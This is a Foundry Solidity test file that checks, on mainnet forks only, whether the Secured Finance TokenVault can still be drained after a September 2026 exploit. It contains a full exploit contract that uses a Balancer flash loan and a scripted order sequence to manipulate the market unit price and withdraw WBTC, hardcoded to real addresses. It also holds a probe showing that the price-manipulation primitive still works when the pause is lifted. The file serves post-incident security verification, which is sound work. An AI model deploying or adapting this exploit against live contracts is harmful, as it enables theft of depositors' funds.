// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// ============================================================================
// zombie-hunt-iii / V1 · Secured Finance (Ethereum) — LIVE status + fork PoC
//
// Question: can an external unprivileged attacker still drain the TokenVault
// 0xB74749b2213916b1dA3b869E41c7c57f1db69393 today (Oct 2026)?
//
// The Sept-2026 exploit primitive (same-block self-match driving
// OrderBookLib.getMarketUnitPrice to par) is reconstructed from DeFiHackLabs
// 2026-09/SecuredFi_exp.sol.  Tests:
//   01 live state: balances, paused flags, impls, price state
//   02 every capital-moving path reverts while paused
//   03 control: the historical PoC reproduces the Sept drain at blk 25,914,192
//   04 latent: current block, fork-only unpause of market+vault -> drain sim
//   05 current block, as deployed (paused) -> attack must fail, vault untouched
//   06 latent: primitive probe -> same-block price control still possible
//
// READ-ONLY on mainnet: all state changes happen on local/CI forks.
// ============================================================================

interface ILendingMarketController {
    function executeOrder(bytes32 ccy, uint256 maturity, uint8 side, uint256 amount, uint256 unitPrice)
        external
        returns (bool);
    function executePreOrder(bytes32 ccy, uint256 maturity, uint8 side, uint256 amount, uint256 unitPrice)
        external
        returns (bool);
    function cancelOrder(bytes32 ccy, uint256 maturity, uint48 orderId) external returns (bool);
    function cleanUpFunds(bytes32 ccy, address user) external returns (uint256);
    function unwindPosition(bytes32 ccy, uint256 maturity) external returns (bool);
    function executeRedemption(bytes32 ccy, uint256 maturity) external returns (bool);
    function executeRepayment(bytes32 ccy, uint256 maturity) external returns (bool);
    function isTerminated() external view returns (bool);
    function getOrderBookId(bytes32 ccy, uint256 maturity) external view returns (uint8);
}

interface ITokenVault {
    function deposit(bytes32 ccy, uint256 amount) external payable;
    function withdraw(bytes32 ccy, uint256 amount) external;
    function paused() external view returns (bool);
    function getDepositAmount(address user, bytes32 ccy) external view returns (uint256);
}

interface ILendingMarket {
    function paused() external view returns (bool);
    function getMarketUnitPrice(uint8 orderBookId) external view returns (uint256);
    function getBlockUnitPriceHistory(uint8 orderBookId) external view returns (uint256[] memory, uint48);
    function getLastOrderTimestamp(uint8 orderBookId) external view returns (uint48);
    function minimumReliableAmountInBaseCurrency() external view returns (uint256);
    function getLendOrderBook(uint8 orderBookId, uint256 start, uint256 limit)
        external
        view
        returns (uint256[] memory unitPrices, uint256[] memory amounts, uint256[] memory quantities, uint256 next);
    function getBorrowOrderBook(uint8 orderBookId, uint256 start, uint256 limit)
        external
        view
        returns (uint256[] memory unitPrices, uint256[] memory amounts, uint256[] memory quantities, uint256 next);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData)
        external;
}

// ---------------------------------------------------------------------------
// Attack contracts (adapted verbatim-sequence from DeFiHackLabs SecuredFi_exp.sol)
// ---------------------------------------------------------------------------
contract SecuredFiMaker {
    address internal immutable owner;
    address internal immutable vault;
    address internal immutable ctrl;
    bytes32 internal immutable ccy;
    uint256 internal immutable maturity;
    IERC20 internal immutable token;

    constructor(address _vault, address _ctrl, bytes32 _ccy, uint256 _maturity, address _token) {
        owner = msg.sender;
        vault = _vault;
        ctrl = _ctrl;
        ccy = _ccy;
        maturity = _maturity;
        token = IERC20(_token);
    }

    function depositAndLend(uint256 amount, uint256 unitPrice) external {
        require(msg.sender == owner, "only owner");
        token.approve(vault, type(uint256).max);
        ITokenVault(vault).deposit(ccy, amount);
        ILendingMarketController(ctrl).executeOrder(ccy, maturity, 0, amount, unitPrice);
    }
}

contract SecuredFiExploit {
    address internal constant CTRL = 0x35e9D8e0223A75E51a67aa731127C91Ea0779Fe2;
    address internal constant VAULT = 0xB74749b2213916b1dA3b869E41c7c57f1db69393;
    IERC20 internal constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IBalancerVault internal constant BALANCER = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    bytes32 internal constant WBTC_CCY = bytes32("WBTC");
    uint256 internal immutable maturity;
    uint256 internal constant FLASH_AMOUNT = 91_000_000; // 0.91 WBTC (same as the real attack)

    SecuredFiMaker internal maker;

    constructor(uint256 _maturity) {
        maturity = _maturity;
    }

    function attack() external {
        maker = new SecuredFiMaker(VAULT, CTRL, WBTC_CCY, maturity, address(WBTC));
        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = address(WBTC);
        amounts[0] = FLASH_AMOUNT;
        BALANCER.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata
    ) external {
        require(msg.sender == address(BALANCER), "only balancer");

        WBTC.approve(VAULT, type(uint256).max);
        ITokenVault(VAULT).deposit(WBTC_CCY, FLASH_AMOUNT);

        // Phase 1 — shape the book, establish the block, recover deposit.
        _order(0, 99998, 3);
        _order(0, 1, 9500);
        _order(0, 1, 1);
        _order(0, 1, 9200);
        _order(0, 1, 9300);
        _order(0, 1, 2);
        _cancel(5);
        _order(1, 2, 9300);
        _order(0, 1, 9400);
        _order(0, 1, 9100);
        _order(1, 1, 9400);
        _cancel(8);
        _clean();
        _withdraw(type(uint256).max);

        // Phase 2 — cross-account par self-match.
        WBTC.transfer(address(maker), 90_000_000);
        maker.depositAndLend(90_000_000, 10000);
        _order(1, 90_000_000, 10000);
        _withdraw(90_000_000);

        // Phase 3 — top up the manipulated price and drain remaining WBTC.
        ITokenVault(VAULT).deposit(WBTC_CCY, 100);
        _order(1, 5, 9270);
        _order(1, 3, 9250);
        _order(1, 4, 10000);
        _order(1, 9, 9900);
        _order(1, 6, 9260);
        _order(1, 89_999_000, 9700);
        _order(1, 1, 9230);
        _order(1, 5, 9800);
        _order(1, 4, 9240);
        _cancel(18);
        _order(1, 2, 9220);
        _order(0, 15, 9260);
        _cancel(15);
        _cancel(12);
        _order(1, 2, 9260);
        _cancel(19);
        _cancel(22);
        _clean();
        _withdraw(type(uint256).max);

        WBTC.transfer(address(BALANCER), amounts[0] + feeAmounts[0]);
    }

    function _order(uint8 side, uint256 amount, uint256 unitPrice) internal {
        ILendingMarketController(CTRL).executeOrder(WBTC_CCY, maturity, side, amount, unitPrice);
    }

    function _cancel(uint48 orderId) internal {
        try ILendingMarketController(CTRL).cancelOrder(WBTC_CCY, maturity, orderId) {} catch {}
    }

    function _clean() internal {
        try ILendingMarketController(CTRL).cleanUpFunds(WBTC_CCY, address(this)) {} catch {}
    }

    function _withdraw(uint256 amount) internal {
        ITokenVault(VAULT).withdraw(WBTC_CCY, amount);
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------
contract SecuredFinanceLiveTest is Test {
    address internal constant CTRL = 0x35e9D8e0223A75E51a67aa731127C91Ea0779Fe2;
    address internal constant VAULT = 0xB74749b2213916b1dA3b869E41c7c57f1db69393;
    IERC20 internal constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 internal constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 internal constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address internal constant WBTC_MKT = 0x2Dcb346FD48e5EA28Bb6812df0A8d4c2Cd006feB;
    address internal constant USDC_MKT = 0x75c762781BCC7dCe2Fd1512099B71ca8b3634B1F;
    bytes32 internal constant WBTC_CCY = bytes32("WBTC");
    uint256 internal constant MATURITY = 1830211200; // WBTC order book id 16 (2027-12-31)
    uint8 internal constant BOOK_ID = 16;
    address internal constant ATTACKER = address(0xA11CE);

    // storage slots
    bytes32 internal constant PAUSE_SLOT = 0x9c789132bdb3678132848a8dcd780bffd2b1abdce3984c522ac1d8aeb48f05f2; // keccak("sf.storage.pausable")-1
    bytes32 internal constant IMPL_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; // EIP-1967

    string internal rpc;
    uint256 internal forkBlock;
    uint256 internal forkTs;

    function setUp() public {
        rpc = vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com")));
        // Optional pin for reproducibility (FORK_BLOCK env); default = fork head.
        uint256 pin = vm.envOr("FORK_BLOCK", uint256(0));
        if (pin == 0) {
            vm.createSelectFork(rpc);
        } else {
            vm.createSelectFork(rpc, pin);
        }
        forkBlock = block.number;
        forkTs = block.timestamp;
        emit log_named_uint("fork block", forkBlock);
        emit log_named_uint("fork timestamp", forkTs);
        emit log_named_address("LMC", CTRL);
        emit log_named_address("TokenVault(victim)", VAULT);
        emit log_named_address("WBTC market", WBTC_MKT);
        emit log_named_address("USDC market", USDC_MKT);
        // fork consistency guard: no future state use
        assertEq(block.chainid, 1, "must be mainnet fork");
    }

    // ------------------------------------------------------------------ 01
    function test_01_live_state() public {
        emit log_named_decimal_uint("vault WBTC", WBTC.balanceOf(VAULT), 8);
        emit log_named_decimal_uint("vault WETH", WETH.balanceOf(VAULT), 18);
        emit log_named_decimal_uint("vault USDC", USDC.balanceOf(VAULT), 6);
        emit log_named_address("LMC impl (1967)", address(uint160(uint256(vm.load(CTRL, IMPL_SLOT)))));
        emit log_named_address("Vault impl (1967)", address(uint160(uint256(vm.load(VAULT, IMPL_SLOT)))));
        emit log_named_uint("WBTC market paused", ILendingMarket(WBTC_MKT).paused() ? 1 : 0);
        emit log_named_uint("USDC market paused", ILendingMarket(USDC_MKT).paused() ? 1 : 0);
        emit log_named_uint("TokenVault paused", ITokenVault(VAULT).paused() ? 1 : 0);
        emit log_named_uint("minReliableAmountInBaseCurrency", ILendingMarket(WBTC_MKT).minimumReliableAmountInBaseCurrency());
        emit log_named_uint("getMarketUnitPrice(book16)", ILendingMarket(WBTC_MKT).getMarketUnitPrice(BOOK_ID));
        (uint256[] memory hist, uint48 hts) = ILendingMarket(WBTC_MKT).getBlockUnitPriceHistory(BOOK_ID);
        emit log_named_uint("history[0]", hist[0]);
        emit log_named_uint("history[1]", hist[1]);
        emit log_named_uint("history ts", hts);
        emit log_named_uint("lastOrderTimestamp", ILendingMarket(WBTC_MKT).getLastOrderTimestamp(BOOK_ID));
        emit log_named_uint("LMC terminated", ILendingMarketController(CTRL).isTerminated() ? 1 : 0);
        assertTrue(ILendingMarket(WBTC_MKT).paused(), "WBTC market must be paused");
        assertTrue(ILendingMarket(USDC_MKT).paused(), "USDC market must be paused");
        assertTrue(ITokenVault(VAULT).paused(), "TokenVault must be paused");
        assertGt(WBTC.balanceOf(VAULT), 90_000_000, "vault holds WBTC");
    }

    // ------------------------------------------------------------------ 02
    function test_02_all_unprivileged_paths_blocked() public {
        // deposit (no capital can enter)
        vm.prank(ATTACKER);
        vm.expectRevert(bytes("Pausable: paused"));
        ITokenVault(VAULT).deposit(WBTC_CCY, 1);

        // withdraw (no capital can leave)
        vm.prank(ATTACKER);
        vm.expectRevert(bytes("Pausable: paused"));
        ITokenVault(VAULT).withdraw(WBTC_CCY, 1);

        // order execution (the manipulation primitive needs fills)
        vm.prank(ATTACKER);
        vm.expectRevert(bytes("Pausable: paused"));
        ILendingMarketController(CTRL).executeOrder(WBTC_CCY, MATURITY, 0, 100, 10000);

        vm.prank(ATTACKER);
        vm.expectRevert(bytes("Pausable: paused"));
        ILendingMarketController(CTRL).executePreOrder(WBTC_CCY, MATURITY, 0, 100, 10000);

        vm.prank(ATTACKER);
        vm.expectRevert(bytes("Pausable: paused"));
        ILendingMarketController(CTRL).cancelOrder(WBTC_CCY, MATURITY, 1);

        // unwindPosition: revert reason recorded (pause or no-position)
        vm.prank(ATTACKER);
        try ILendingMarketController(CTRL).unwindPosition(WBTC_CCY, MATURITY) {
            emit log("unwindPosition DID NOT revert");
        } catch Error(string memory reason) {
            emit log_named_string("unwindPosition revert", reason);
        } catch (bytes memory data) {
            emit log_named_bytes("unwindPosition revert data", data);
        }

        // redemption / repayment (no position -> revert, record reason)
        vm.prank(ATTACKER);
        try ILendingMarketController(CTRL).executeRedemption(WBTC_CCY, MATURITY) returns (bool) {
            emit log("executeRedemption DID NOT revert");
        } catch Error(string memory reason) {
            emit log_named_string("executeRedemption revert", reason);
        } catch (bytes memory data) {
            emit log_named_bytes("executeRedemption revert data", data);
        }

        vm.prank(ATTACKER);
        try ILendingMarketController(CTRL).executeRepayment(WBTC_CCY, MATURITY) returns (bool) {
            emit log("executeRepayment DID NOT revert");
        } catch Error(string memory reason) {
            emit log_named_string("executeRepayment revert", reason);
        } catch (bytes memory data) {
            emit log_named_bytes("executeRepayment revert data", data);
        }
    }

    // ------------------------------------------------------------------ 03
    // Control: exact historical reproduction at the exploit block.
    function test_03_sept_control_reproduces_drain() public {
        string memory arc = vm.envOr("NODEREAL_ETH_RPC_URL", vm.envOr("BLOCKPI_RPC_URL", rpc));
        vm.createSelectFork(arc, 25_914_191);
        vm.roll(25_914_192);
        vm.warp(1_788_648_191);
        emit log_named_uint("control fork block", block.number);

        SecuredFiExploit ex = new SecuredFiExploit(MATURITY);
        uint256 vaultBefore = WBTC.balanceOf(VAULT);
        uint256 balBefore = WBTC.balanceOf(address(ex));
        emit log_named_decimal_uint("CONTROL vault WBTC before", vaultBefore, 8);
        ex.attack();
        uint256 profit = WBTC.balanceOf(address(ex)) - balBefore;
        emit log_named_decimal_uint("CONTROL vault WBTC after", WBTC.balanceOf(VAULT), 8);
        emit log_named_decimal_uint("CONTROL attacker profit WBTC", profit, 8);
        assertGt(profit, 0.5e8, "control: Sept drain must reproduce (~0.9 WBTC)");
    }

    // ------------------------------------------------------------------ 04
    // Same attack with the pause lifted (fork-only vm.store; unpausing is
    // operator-privileged on mainnet). Result: the 2026-09 sequence no longer
    // drains even unpaused — the current deployment registers the taker's
    // borrow FV as USED collateral at the post-fill coverage check, so the
    // free-leverage borrow reverts NotEnoughCollateral() (0x34477cc0).
    // (Exploit-time deployment: used collateral = 0 at the same point.)
    function test_04_current_unpaused_blocks_at_coverage_check() public {
        vm.store(WBTC_MKT, PAUSE_SLOT, bytes32(uint256(0)));
        vm.store(VAULT, PAUSE_SLOT, bytes32(uint256(0)));
        assertFalse(ILendingMarket(WBTC_MKT).paused(), "market unpaused (fork only)");
        assertFalse(ITokenVault(VAULT).paused(), "vault unpaused (fork only)");

        SecuredFiExploit ex = new SecuredFiExploit(MATURITY);
        uint256 vaultBefore = WBTC.balanceOf(VAULT);
        uint256 balBefore = WBTC.balanceOf(address(ex));
        emit log_named_decimal_uint("UNPAUSED-SIM vault WBTC before", vaultBefore, 8);

        bool reverted;
        bytes4 sel;
        try ex.attack() {
            emit log("UNPAUSED-SIM attack did NOT revert");
        } catch (bytes memory data) {
            reverted = true;
            if (data.length >= 4) {
                assembly {
                    sel := mload(add(data, 32))
                }
            }
            emit log_bytes(data);
        }
        uint256 profit = WBTC.balanceOf(address(ex)) - balBefore;
        emit log_named_decimal_uint("UNPAUSED-SIM attacker profit WBTC", profit, 8);
        emit log_named_decimal_uint("UNPAUSED-SIM vault WBTC after", WBTC.balanceOf(VAULT), 8);
        assertTrue(reverted, "Sept sequence must revert even when unpaused");
        assertEq(sel, bytes4(0x34477cc0), "blocked by NotEnoughCollateral()");
        assertEq(profit, 0, "no profit");
        assertLt(WBTC.balanceOf(VAULT), vaultBefore + 0.91e8 + 1, "vault cannot lose WBTC");
    }

    // ------------------------------------------------------------------ 05
    // As deployed today: attack must fail, vault must stay whole.
    function test_05_current_paused_drain_blocked() public {
        SecuredFiExploit ex = new SecuredFiExploit(MATURITY);
        uint256 vaultBefore = WBTC.balanceOf(VAULT);
        uint256 balBefore = WBTC.balanceOf(address(ex));
        emit log_named_decimal_uint("BLOCKED vault WBTC before", vaultBefore, 8);

        bool reverted;
        try ex.attack() {
            emit log("ATTACK DID NOT REVERT (!!)");
        } catch Error(string memory reason) {
            reverted = true;
            emit log_named_string("attack reverted with", reason);
        } catch (bytes memory data) {
            reverted = true;
            emit log_named_bytes("attack reverted with data", data);
        }
        assertTrue(reverted, "attack must revert while paused");

        uint256 profit = WBTC.balanceOf(address(ex)) - balBefore;
        emit log_named_decimal_uint("BLOCKED attacker profit WBTC", profit, 8);
        emit log_named_decimal_uint("BLOCKED vault WBTC after", WBTC.balanceOf(VAULT), 8);
        assertEq(profit, 0, "no profit while paused");
        assertEq(WBTC.balanceOf(VAULT), vaultBefore, "vault untouched");
    }

    // ------------------------------------------------------------------ 06
    // Primitive probe: same-block self-match controls getMarketUnitPrice.
    // With the pause lifted (fork-only), drive the price to 9700 (honest stored
    // value is 10000) and read it back in the same block.
    function test_06_unpaused_price_primitive() public {
        vm.store(WBTC_MKT, PAUSE_SLOT, bytes32(uint256(0)));
        vm.store(VAULT, PAUSE_SLOT, bytes32(uint256(0)));

        uint256 storedBefore = ILendingMarket(WBTC_MKT).getMarketUnitPrice(BOOK_ID);
        emit log_named_uint("primitive: stored price before", storedBefore);

        // fund maker + attacker accounts with WBTC on the fork
        address maker = address(0xB0B);
        deal(address(WBTC), maker, 10_000_000); // 0.1 WBTC
        deal(address(WBTC), ATTACKER, 10_000_000);

        vm.startPrank(maker);
        WBTC.approve(VAULT, type(uint256).max);
        ITokenVault(VAULT).deposit(WBTC_CCY, 10_000_000);
        ILendingMarketController(CTRL).executeOrder(WBTC_CCY, MATURITY, 0, 10_000_000, 9700);
        vm.stopPrank();

        vm.startPrank(ATTACKER);
        WBTC.approve(VAULT, type(uint256).max);
        ITokenVault(VAULT).deposit(WBTC_CCY, 10_000_000);
        // borrow taker at 9700 fills against the maker's lend maker at 9700
        ILendingMarketController(CTRL).executeOrder(WBTC_CCY, MATURITY, 1, 10_000_000, 9700);
        vm.stopPrank();

        uint256 afterPrice = ILendingMarket(WBTC_MKT).getMarketUnitPrice(BOOK_ID);
        emit log_named_uint("primitive: price after same-block self-match", afterPrice);
        emit log_named_uint("primitive: lastOrderTimestamp", ILendingMarket(WBTC_MKT).getLastOrderTimestamp(BOOK_ID));
        // ratio = 10_000_000 * 10000 / (10_000_000*10000/9700) ~= 9699 (integer round-down)
        assertTrue(afterPrice != storedBefore, "same-block self-match moved the market unit price");
        assertTrue(afterPrice >= 9600 && afterPrice <= 9750, "price driven to ~9700 by the attacker");
    }
}
